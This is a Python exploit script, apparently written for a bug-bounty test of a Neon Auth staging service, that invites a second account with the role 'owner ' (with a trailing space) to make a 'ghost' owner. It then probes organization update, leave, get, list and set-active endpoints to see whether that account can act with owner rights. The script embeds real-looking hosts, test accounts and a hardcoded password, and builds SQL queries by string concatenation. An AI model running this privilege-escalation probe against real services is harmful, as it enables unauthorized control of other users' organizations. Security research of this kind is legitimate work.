# -*- coding: utf-8 -*-
"""V11: ghost 'owner ' FULL endpoint permission matrix (last untested ops):
update-organization, leave, get, list, set-active + control rows owner/member.
Any endpoint using startsWith/includes role check would let ghost act."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V11 ghost full-endpoint matrix ==")
    fetch_db_uri()
    c1, c2 = auth(U1), auth(U2)
    out("sessions: %s" % [bool(c1), bool(c2)])
    if not (c1 and c2):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v11-org", "slug": "v11-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    # U2 joins as ghost 'owner '
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": U2, "role": "owner "}, c1)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, c2)
        out("U2 ghost joined -> %d" % st)
    out("   members: %s" % [(x[0], repr(x[1])) for x in dbq(
        'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
        'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])

    def probe(tag, path, body, ck):
        st, d, _ = na("POST", path, body, ck)
        out("%-52s -> %d %s" % (tag, st, d[:110]))

    # ghost ops
    probe("G1 ghost update-org name", "/neondb/auth/organization/update",
          {"organizationId": org, "data": {"name": "v11-renamed-by-ghost"}}, c2)
    probe("G2 ghost update-org logo", "/neondb/auth/organization/update",
          {"organizationId": org, "data": {"logo": "https://evil.invalid/x.png"}}, c2)
    probe("G3 ghost leave", "/neondb/auth/organization/leave",
          {"organizationId": org}, c2)
    probe("G4 ghost get", "/neondb/auth/organization/get",
          {"organizationId": org}, c2)
    probe("G5 ghost list", "/neondb/auth/organization/list", {}, c2)
    probe("G6 ghost set-active", "/neondb/auth/organization/set-active",
          {"organizationId": org}, c2)
    # owner control rows
    probe("C1 owner update-org name", "/neondb/auth/organization/update",
          {"organizationId": org, "data": {"name": "v11-org"}}, c1)
    # member control: U2 was ghost; use a real member? U1 is owner only; add member ctrl via invite member
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": "libobo1229+na_org3@gmail.com",
                   "role": "member"}, c1)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'libobo1229+na_org3@gmail.com'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid:
        c3 = auth("libobo1229+na_org3@gmail.com")
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, c3)
        out("U3 member joined -> %d" % st)
        probe("C2 member update-org", "/neondb/auth/organization/update",
              {"organizationId": org, "data": {"name": "v11-x"}}, c3)
        probe("C3 member leave", "/neondb/auth/organization/leave",
              {"organizationId": org}, c3)
        out("   members after C3: %s" % [(x[0], repr(x[1])) for x in dbq(
            'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])

    # G3 may have removed ghost from org; re-check members
    out("   members final: %s" % [(x[0], repr(x[1])) for x in dbq(
        'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
        'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])
    # cleanup
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup delete org -> %d" % st)
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
